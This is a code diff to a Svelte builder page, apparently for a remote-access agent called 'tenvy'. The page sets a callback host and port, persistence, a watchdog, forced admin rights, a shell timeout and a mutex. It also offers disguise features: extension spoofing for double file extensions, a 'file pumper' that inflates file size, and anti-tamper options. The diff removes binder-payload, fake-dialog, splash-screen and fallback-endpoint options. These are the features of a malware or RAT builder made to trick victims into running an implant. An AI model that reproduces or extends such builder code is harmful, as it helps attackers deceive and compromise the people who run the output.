@@ -34,58 +34,42 @@
 	import PersistenceTab from './components/PersistenceTab.svelte';
 	import ExecutionTab from './components/ExecutionTab.svelte';
 	import PresentationTab from './components/PresentationTab.svelte';
-	import SplashSettingsDialog from './components/SplashSettingsDialog.svelte';
 	import {
 		ANTI_TAMPER_BADGES,
 		ARCHITECTURE_OPTIONS_BY_OS,
-		BINDER_SIZE_LIMIT_BYTES,
 		DEFAULT_FILE_INFORMATION,
-		DEFAULT_SPLASH_SCREEN,
 		EXTENSION_OPTIONS_BY_OS,
 		EXTENSION_SPOOF_PRESETS,
-		FAKE_DIALOG_DEFAULTS,
-		FAKE_DIALOG_OPTIONS,
 		FILE_PUMPER_UNIT_TO_BYTES,
 		FILE_PUMPER_UNITS,
 		INPUT_FIELD_CLASSES,
 		INSTALLATION_PATH_PRESETS,
 		MAX_FILE_PUMPER_BYTES,
-		SPLASH_LAYOUT_OPTIONS,
 		TARGET_OS_OPTIONS,
 		type CookieKV,
-		type Endpoint,
 		type ExtensionSpoofPreset,
-		type FakeDialogType,
 		type FilePumperUnit,
 		type HeaderKV,
-		type SplashLayout,
 		type TargetArch,
 		type TargetOS
 	} from './lib/constants.js';
 	import {
 		addCustomCookie as createCustomCookie,
 		addCustomHeader as createCustomHeader,
-		addFallbackEndpoint as createFallbackEndpoint,
-		formatFileSize,
 		generateMutexName as randomMutexSuffix,
 		inputValueFromEvent,
-		isSpoofPreset,
-		normalizeHexColor,
-		normalizePortValue,
 		normalizeSpoofExtension,
 		parseListInput,
-		readFileAsBase64,
 		removeCustomCookie as deleteCustomCookie,
 		removeCustomHeader as deleteCustomHeader,
-		removeFallbackEndpoint as deleteFallbackEndpoint,
 		sanitizeFileInformation as sanitizeFileInformationPayload,
 		toIsoDateTime,
 		updateCustomCookie as writeCustomCookie,
 		updateCustomHeader as writeCustomHeader,
-		updateFallbackEndpoint as writeFallbackEndpoint,
 		validateSpoofExtension,
 		withPresetSpoofExtension
 	} from './lib/utils.js';
+	import type { BuildRequest } from '../../../../../shared/types/build';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
 
@@ -121,7 +105,6 @@
 	let fileIconError = $state<string | null>(null);
 	let generatedSecret = $state<string | null>(null);
 
-	let SplashPreview!: Snippet<[{ className?: string }]>;
 	let secretCopyState = $state<'idle' | 'copied' | 'error'>('idle');
 	let secretCopyTimeout: ReturnType<typeof setTimeout> | null = null;
 	let buildWarnings = $state<string[]>([]);
@@ -130,8 +113,6 @@
 	let shellTimeoutSeconds = $state('');
 	let fileInformation = $state({ ...DEFAULT_FILE_INFORMATION });
 	let fileInformationOpen = $state(false);
-	let groupTag = $state('');
-	let fallbackEndpoints = $state<Endpoint[]>([{ host: '', port: '' }]);
 	let watchdogEnabled = $state(false);
 	let watchdogIntervalSeconds = $state('60');
 	let enableFilePumper = $state(false);
@@ -146,22 +127,6 @@
 	let executionRequireInternet = $state(true);
 	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
 	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
-	let fakeDialogType = $state<FakeDialogType>('none');
-	let fakeDialogTitle = $state('');
-	let fakeDialogMessage = $state('');
-	let splashScreenEnabled = $state(false);
-	let splashDialogOpen = $state(false);
-	let splashTitle = $state(DEFAULT_SPLASH_SCREEN.title);
-	let splashSubtitle = $state(DEFAULT_SPLASH_SCREEN.subtitle);
-	let splashMessage = $state(DEFAULT_SPLASH_SCREEN.message);
-	let splashBackgroundColor = $state(DEFAULT_SPLASH_SCREEN.background);
-	let splashAccentColor = $state(DEFAULT_SPLASH_SCREEN.accent);
-	let splashTextColor = $state(DEFAULT_SPLASH_SCREEN.text);
-	let splashLayout = $state<SplashLayout>(DEFAULT_SPLASH_SCREEN.layout);
-	let binderFileName = $state<string | null>(null);
-	let binderFileSize = $state<number | null>(null);
-	let binderFileError = $state<string | null>(null);
-	let binderFileData = $state<string | null>(null);
 	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');
 
 	const sanitizedOutputBase = $derived.by(() => {
@@ -182,31 +147,11 @@
 	});
 
 	const activeSpoofExtension = $derived(
-		withPresetSpoofExtension(
-			extensionSpoofingEnabled,
-			extensionSpoofCustom,
-			extensionSpoofPreset
-		)
+		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
 	);
 
 	const effectiveOutputFilename = $derived(
 		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
-	);
-
-	const normalizedSplashTitle = $derived(splashTitle.trim() || DEFAULT_SPLASH_SCREEN.title);
-	const normalizedSplashSubtitle = $derived(splashSubtitle.trim());
-	const normalizedSplashMessage = $derived(splashMessage.trim() || DEFAULT_SPLASH_SCREEN.message);
-	const normalizedSplashBackground = $derived(
-		normalizeHexColor(splashBackgroundColor, DEFAULT_SPLASH_SCREEN.background)
-	);
-	const normalizedSplashAccent = $derived(
-		normalizeHexColor(splashAccentColor, DEFAULT_SPLASH_SCREEN.accent)
-	);
-	const normalizedSplashText = $derived(
-		normalizeHexColor(splashTextColor, DEFAULT_SPLASH_SCREEN.text)
-	);
-	const splashLayoutLabel = $derived(
-		SPLASH_LAYOUT_OPTIONS.find((option) => option.value === splashLayout)?.label ?? 'Centered'
 	);
 
 	const isWindowsTarget = $derived(targetOS === 'windows');
@@ -226,16 +171,14 @@
 	let isBuilding = $derived(buildStatus === 'running');
 
 	$effect(() => {
-		const allowedExtensions =
-			EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
+		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
 		if (!allowedExtensions.includes(outputExtension)) {
 			outputExtension = allowedExtensions[0];
 		}
 	});
 
 	$effect(() => {
-		const archOptions =
-			ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? ARCHITECTURE_OPTIONS_BY_OS.windows;
+		const archOptions = ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? ARCHITECTURE_OPTIONS_BY_OS.windows;
 		if (!archOptions.some((option) => option.value === targetArch)) {
 			targetArch = archOptions[0]?.value ?? 'amd64';
 		}
@@ -288,32 +231,8 @@
 		];
 	}
 
-	function resetSplashToDefaults() {
-		splashTitle = DEFAULT_SPLASH_SCREEN.title;
-		splashSubtitle = DEFAULT_SPLASH_SCREEN.subtitle;
-		splashMessage = DEFAULT_SPLASH_SCREEN.message;
-		splashBackgroundColor = DEFAULT_SPLASH_SCREEN.background;
-		splashAccentColor = DEFAULT_SPLASH_SCREEN.accent;
-		splashTextColor = DEFAULT_SPLASH_SCREEN.text;
-		splashLayout = DEFAULT_SPLASH_SCREEN.layout;
-	}
-
 	function applyInstallationPreset(preset: string) {
 		installationPath = preset;
-	}
-
-	function setFallbackEndpoint(index: number, key: 'host' | 'port', value: string) {
-		const normalized = key === 'port' ? normalizePortValue(value) : value;
-		fallbackEndpoints = writeFallbackEndpoint(fallbackEndpoints, index, key, normalized);
-	}
-
-	function addFallbackEndpoint() {
-		fallbackEndpoints = createFallbackEndpoint(fallbackEndpoints);
-	}
-
-	function removeFallbackEndpoint(index: number) {
-		const updated = deleteFallbackEndpoint(fallbackEndpoints, index);
-		fallbackEndpoints = updated.length > 0 ? updated : [{ host: '', port: '' }];
 	}
 
 	function addCustomHeader() {
@@ -344,10 +263,6 @@
 
 	function assignMutexName(length = 16) {
 		mutexName = `Global\\tenvy-${randomMutexSuffix(length).toUpperCase()}`;
-	}
-
-	function openSplashDialog() {
-		splashDialogOpen = true;
 	}
 
 	async function handleIconSelection(event: Event) {
@@ -388,45 +303,6 @@
 		fileIconName = null;
 		fileIconData = null;
 		fileIconError = null;
-	}
-
-	async function handleBinderSelection(event: Event) {
-		const input = event.target as HTMLInputElement;
-		const file = input.files?.[0] ?? null;
-		binderFileError = null;
-
-		if (!file) {
-			binderFileName = null;
-			binderFileSize = null;
-			binderFileData = null;
-			return;
-		}
-
-		if (file.size > BINDER_SIZE_LIMIT_BYTES) {
-			binderFileError = 'Binder payload must be 50MB or smaller.';
-			binderFileName = null;
-			binderFileSize = null;
-			binderFileData = null;
-			return;
-		}
-
-		try {
-			binderFileData = await readFileAsBase64(file);
-			binderFileName = file.name;
-			binderFileSize = file.size;
-		} catch (err) {
-			binderFileError = err instanceof Error ? err.message : 'Failed to process binder payload.';
-			binderFileName = null;
-			binderFileSize = null;
-			binderFileData = null;
-		}
-	}
-
-	function clearBinderSelection() {
-		binderFileName = null;
-		binderFileSize = null;
-		binderFileError = null;
-		binderFileData = null;
 	}
 
 	async function buildAgent() {
@@ -487,36 +363,6 @@
 			}
 		}
 
-		const trimmedGroupTag = groupTag.trim();
-		const normalizedFallbackEndpoints = fallbackEndpoints
-			.map((endpoint) => ({
-				host: endpoint.host.trim(),
-				port: endpoint.port.trim()
-			}))
-			.filter((endpoint) => endpoint.host !== '' || endpoint.port !== '');
-
-		for (const endpoint of normalizedFallbackEndpoints) {
-			if (!endpoint.host) {
-				buildError = 'Each backup endpoint requires a host value.';
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				buildProgress = 100;
-				return;
-			}
-			if (endpoint.port && !/^\d+$/.test(endpoint.port)) {
-				buildError = `Backup endpoint port for ${endpoint.host} must be numeric.`;
-				pushProgress(buildError, 'error');
-				buildStatus = 'error';
-				buildProgress = 100;
-				return;
-			}
-		}
-
-		const sanitizedFallbackEndpoints = normalizedFallbackEndpoints.map((endpoint) => ({
-			host: endpoint.host,
-			port: endpoint.port || '2332'
-		}));
-
 		const sanitizedHeaders = customHeaders
 			.map((header) => ({
 				key: header.key.trim(),
@@ -565,8 +411,7 @@
 				return;
 			}
 
-			const multiplier =
-				FILE_PUMPER_UNIT_TO_BYTES[filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
+			const multiplier = FILE_PUMPER_UNIT_TO_BYTES[filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
 			const computedBytes = Math.round(parsedSize * multiplier);
 			if (
 				!Number.isFinite(computedBytes) ||
@@ -644,19 +489,11 @@
 			}
 		}
 
-		if (binderFileName && !binderFileData) {
-			buildError = 'Binder payload is still processing. Please reselect the file.';
-			pushProgress(buildError, 'error');
-			buildStatus = 'error';
-			buildProgress = 100;
-			return;
-		}
-
 		buildStatus = 'running';
 		buildProgress = 5;
 		pushProgress('Preparing build request...');
 
-		const payload: Record<string, unknown> = {
+		const payload: BuildRequest = {
 			host: trimmedHost,
 			port: trimmedPort || '2332',
 			outputFilename: effectiveOutputFilename,
@@ -672,25 +509,17 @@
 			forceAdmin
 		};
 
-		if (trimmedGroupTag) {
-			payload.groupTag = trimmedGroupTag;
-		}
-		if (sanitizedFallbackEndpoints.length > 0) {
-			payload.fallbackEndpoints = sanitizedFallbackEndpoints;
-		}
 		if (watchdogIntervalValue !== null) {
 			payload.watchdog = {
 				enabled: true,
 				intervalSeconds: watchdogIntervalValue
-			} satisfies Record<string, unknown>;
+			};
 		}
 		if (filePumperTargetBytes !== null) {
 			payload.filePumper = {
 				enabled: true,
-				targetBytes: filePumperTargetBytes,
-				unit: filePumperUnit,
-				displayValue: trimmedFilePumperSize
-			} satisfies Record<string, unknown>;
+				targetBytes: filePumperTargetBytes
+			};
 		}
 
 		const shouldIncludeExecutionTriggers =
@@ -733,41 +562,6 @@
 		if (sanitizedCookies.length > 0) {
 			payload.customCookies = sanitizedCookies;
 		}
-		if (fakeDialogType !== 'none') {
-			const defaults =
-				FAKE_DIALOG_DEFAULTS[fakeDialogType as Exclude<FakeDialogType, 'none'>];
-			const title = fakeDialogTitle.trim() || defaults.title;
-			const message = fakeDialogMessage.trim() || defaults.message;
-			payload.fakeDialog = {
-				type: fakeDialogType,
-				title,
-				message
-			} satisfies Record<string, unknown>;
-		}
-		if (splashScreenEnabled) {
-			const subtitle = normalizedSplashSubtitle;
-			const splashPayload = {
-				enabled: true,
-				title: normalizedSplashTitle,
-				message: normalizedSplashMessage,
-				layout: splashLayout,
-				colors: {
-					background: normalizedSplashBackground,
-					text: normalizedSplashText,
-					accent: normalizedSplashAccent
-				},
-				...(subtitle ? { subtitle } : {})
-			} satisfies Record<string, unknown>;
-			payload.splashScreen = splashPayload;
-		}
-		if (binderFileData && binderFileName) {
-			payload.binder = {
-				name: binderFileName,
-				size: binderFileSize ?? undefined,
-				data: binderFileData
-			} satisfies Record<string, unknown>;
-		}
-
 		if (trimmedPollInterval) {
 			payload.pollIntervalMs = trimmedPollInterval;
 		}
@@ -891,7 +685,6 @@
 </script>
 
 <div class="mx-auto w-full space-y-6 px-4 pb-10">
-
 	<Card>
 		<CardHeader class="space-y-4">
 			<div class="flex flex-wrap items-center justify-between gap-3">
@@ -937,24 +730,19 @@
 								bind:host
 								bind:port
 								bind:outputFilename
-								effectiveOutputFilename={effectiveOutputFilename}
-								bind:groupTag
+								{effectiveOutputFilename}
 								bind:targetOS
 								bind:targetArch
 								bind:outputExtension
 								bind:extensionSpoofingEnabled
 								bind:extensionSpoofPreset
 								bind:extensionSpoofCustom
-								extensionSpoofError={extensionSpoofError}
+								{extensionSpoofError}
 								bind:pollIntervalMs
 								bind:maxBackoffMs
 								bind:shellTimeoutSeconds
-								fallbackEndpoints={fallbackEndpoints}
-								customHeaders={customHeaders}
-								customCookies={customCookies}
-								{setFallbackEndpoint}
-								{addFallbackEndpoint}
-								{removeFallbackEndpoint}
+								{customHeaders}
+								{customCookies}
 								{addCustomHeader}
 								{updateCustomHeader}
 								{removeCustomHeader}
@@ -994,31 +782,13 @@
 						</TabsContent>
 						<TabsContent value="presentation" class="space-y-6">
 							<PresentationTab
-								binderFileName={binderFileName}
-								binderFileSize={binderFileSize}
-								binderFileError={binderFileError}
-								{handleBinderSelection}
-								{clearBinderSelection}
-								bind:fakeDialogType
-								bind:fakeDialogTitle
-								bind:fakeDialogMessage
-								bind:splashScreenEnabled
-								splashLayout={splashLayout}
-								splashLayoutLabel={splashLayoutLabel}
-								normalizedSplashTitle={normalizedSplashTitle}
-								normalizedSplashSubtitle={normalizedSplashSubtitle}
-								normalizedSplashMessage={normalizedSplashMessage}
-								normalizedSplashAccent={normalizedSplashAccent}
-								normalizedSplashBackground={normalizedSplashBackground}
-								normalizedSplashText={normalizedSplashText}
-								openSplashDialog={openSplashDialog}
-								fileIconName={fileIconName}
-								fileIconError={fileIconError}
+								{fileIconName}
+								{fileIconError}
 								{handleIconSelection}
 								{clearIconSelection}
-								isWindowsTarget={isWindowsTarget}
+								{isWindowsTarget}
 								bind:fileInformationOpen
-								fileInformation={fileInformation}
+								{fileInformation}
 							/>
 						</TabsContent>
 					</Tabs>
@@ -1142,22 +912,4 @@
 			</div>
 		</CardContent>
 	</Card>
-			<SplashSettingsDialog
-				bind:open={splashDialogOpen}
-				bind:splashScreenEnabled
-				bind:splashTitle
-				bind:splashSubtitle
-				bind:splashMessage
-				bind:splashBackgroundColor
-				bind:splashAccentColor
-				bind:splashTextColor
-				bind:splashLayout
-				normalizedSplashTitle={normalizedSplashTitle}
-				normalizedSplashSubtitle={normalizedSplashSubtitle}
-				normalizedSplashMessage={normalizedSplashMessage}
-				normalizedSplashAccent={normalizedSplashAccent}
-				normalizedSplashBackground={normalizedSplashBackground}
-				normalizedSplashText={normalizedSplashText}
-				resetSplashToDefaults={resetSplashToDefaults}
-			/>
 </div>
